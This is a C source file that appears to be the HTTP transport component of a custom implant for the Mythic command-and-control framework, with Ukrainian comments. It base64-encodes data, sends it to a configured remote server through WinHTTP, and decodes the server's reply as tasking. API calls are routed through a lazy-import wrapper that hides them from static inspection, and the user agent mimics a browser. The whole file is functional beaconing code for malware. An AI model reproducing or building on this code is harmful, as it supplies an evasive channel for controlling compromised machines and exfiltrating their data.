#include "Transport.h"
#include "config.h"
#include "kort.h"   // твоя структура конфігу

static const CHAR b64Table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

SIZE_T b64EncodedSize(SIZE_T inputLen) {
    return ((inputLen + 2) / 3) * 4;
}

PCHAR b64Encode(const PBYTE data, SIZE_T len) {
    SIZE_T outLen = b64EncodedSize(len);
    PCHAR out = (PCHAR)LI_FN(LocalAlloc)(LPTR, outLen + 1);
    if (!out) return NULL;

    SIZE_T i = 0, j = 0;
    while (i < len) {
        UINT32 a = i < len ? data[i++] : 0;
        UINT32 b = i < len ? data[i++] : 0;
        UINT32 c = i < len ? data[i++] : 0;
        UINT32 triple = (a << 16) | (b << 8) | c;
        out[j++] = b64Table[(triple >> 18) & 0x3F];
        out[j++] = b64Table[(triple >> 12) & 0x3F];
        out[j++] = b64Table[(triple >> 6)  & 0x3F];
        out[j++] = b64Table[ triple        & 0x3F];
    }
    SIZE_T mod = len % 3;
    if (mod == 1) { out[outLen - 2] = '='; out[outLen - 1] = '='; }
    else if (mod == 2) { out[outLen - 1] = '='; }
    out[outLen] = 0;
    return out;
}

static INT b64Value(CHAR c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

PBYTE b64Decode(PCHAR input, PSIZE_T outLen) {
    if (!input || !outLen) return NULL;

    SIZE_T len = 0; while (input[len]) len++;
    PBYTE out = (PBYTE)LI_FN(LocalAlloc)(LPTR, len);
    if (!out) return NULL;

    SIZE_T i = 0, j = 0;
    while (i < len) {
        while (i < len && (input[i] == '\r' || input[i] == '\n' || input[i] == ' ')) i++;
        if (i >= len) break;
        INT v1 = b64Value(input[i++]); if (v1 < 0) break;
        INT v2 = b64Value(input[i++]); if (v2 < 0) break;
        INT v3 = (i < len && input[i] != '=') ? b64Value(input[i++]) : -1;
        INT v4 = (i < len && input[i] != '=') ? b64Value(input[i++]) : -1;
        UINT32 triple = ((UINT32)v1 << 18) | ((UINT32)v2 << 12) |
                        ((UINT32)(v3 < 0 ? 0 : v3) << 6) |
                        ((UINT32)(v4 < 0 ? 0 : v4));
        out[j++] = (triple >> 16) & 0xFF;
        if (v3 >= 0) out[j++] = (triple >> 8) & 0xFF;
        if (v4 >= 0) out[j++] =  triple       & 0xFF;
    }
    *outLen = j;
    return out;
}

PParser sendAndReceive(PBYTE data, SIZE_T size) {
    if (!kortConfig) return NULL;

    HINTERNET hSession = LI_FN(WinHttpOpen)(
        (kortConfig->userAgent && kortConfig->userAgent[0]) ? kortConfig->userAgent : L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = LI_FN(WinHttpConnect)(hSession, kortConfig->hostName,
                                               (INTERNET_PORT)kortConfig->httpPort, 0);
    if (!hConnect) { LI_FN(WinHttpCloseHandle)(hSession); return NULL; }

    HINTERNET hRequest = LI_FN(WinHttpOpenRequest)(hConnect, kortConfig->httpMethod,
                                                   kortConfig->endPoint, NULL, NULL, NULL,
                                                   kortConfig->isSSL ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        LI_FN(WinHttpCloseHandle)(hConnect);
        LI_FN(WinHttpCloseHandle)(hSession);
        return NULL;
    }

    // Заголовки — Mythic очікує Content-Type: application/octet-stream (зазвичай)
    LPCWSTR hdrs = L"Content-Type: application/octet-stream\r\n";
    if (!LI_FN(WinHttpSendRequest)(hRequest, hdrs, -1L, data, (DWORD)size, (DWORD)size, 0)) {
        LI_FN(WinHttpCloseHandle)(hRequest);
        LI_FN(WinHttpCloseHandle)(hConnect);
        LI_FN(WinHttpCloseHandle)(hSession);
        return NULL;
    }

    if (!LI_FN(WinHttpReceiveResponse)(hRequest, NULL)) {
        LI_FN(WinHttpCloseHandle)(hRequest);
        LI_FN(WinHttpCloseHandle)(hConnect);
        LI_FN(WinHttpCloseHandle)(hSession);
        return NULL;
    }

    PBYTE responseBuffer = NULL;
    SIZE_T responseLength = 0;
    DWORD dwSize = 0;

    PBYTE tempBuf = (PBYTE)LI_FN(LocalAlloc)(LPTR, 4096);
    if (!tempBuf) { /* cleanup */ }

    do {
        dwSize = 0;
        if (!LI_FN(WinHttpReadData)(hRequest, tempBuf, 4096, &dwSize)) break;
        if (dwSize > 0) {
            PBYTE newBuf = (PBYTE)LI_FN(LocalAlloc)(LPTR, responseLength + dwSize);
            if (!newBuf) break;
            if (responseBuffer) {
                LI_FN(memcpy)(newBuf, responseBuffer, responseLength);
                LI_FN(LocalFree)(responseBuffer);
            }
            LI_FN(memcpy)(newBuf + responseLength, tempBuf, dwSize);
            responseBuffer = newBuf;
            responseLength += dwSize;
        }
    } while (dwSize > 0);

    LI_FN(LocalFree)(tempBuf);
    LI_FN(WinHttpCloseHandle)(hRequest);
    LI_FN(WinHttpCloseHandle)(hConnect);
    LI_FN(WinHttpCloseHandle)(hSession);

    if (responseBuffer && responseLength > 0) {
        SIZE_T decodedLen = 0;
        PBYTE decoded = b64Decode((PCHAR)responseBuffer, &decodedLen);
        LI_FN(LocalFree)(responseBuffer);
        if (decoded) return newParser(decoded, decodedLen);
    }
    return NULL;
}

PParser sendPackage(PPackage package) {
    if (!package) return NULL;
    PCHAR b64 = b64Encode((PBYTE)package->buffer, package->length);
    if (!b64) return NULL;
    SIZE_T b64size = b64EncodedSize(package->length);
    PParser resp = sendAndReceive((PBYTE)b64, b64size);
    LI_FN(LocalFree)(b64);
    return resp;
}